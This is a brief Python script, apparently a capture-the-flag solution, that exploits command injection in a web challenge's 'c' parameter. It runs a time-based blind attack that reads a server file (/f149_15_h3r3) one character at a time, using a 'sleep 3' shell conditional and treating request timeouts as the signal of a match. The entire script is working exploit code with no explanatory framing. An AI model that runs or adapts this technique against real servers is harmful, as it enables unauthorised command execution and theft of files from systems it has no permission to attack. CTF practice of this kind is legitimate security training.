import requests
import time
import string

# 数字0-9和小写字符a-z 和字符"-"
str = string.digits + string.ascii_lowercase + "-"

result = ""
key = 0
for j in range(1, 45):
    # print(j)
    time.sleep(0.1)
    if key == 1:
        break
    for n in str:
        payload = "if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j, n)
        # print(payload)
        url = "http://ed4206b5-8f05-4455-b817-efcc761da957.challenge.ctf.show/?c=" + payload
        try:
            requests.get(url, timeout=(2.5, 2.5))
        except:
            result = result + n
            print(result)
            break
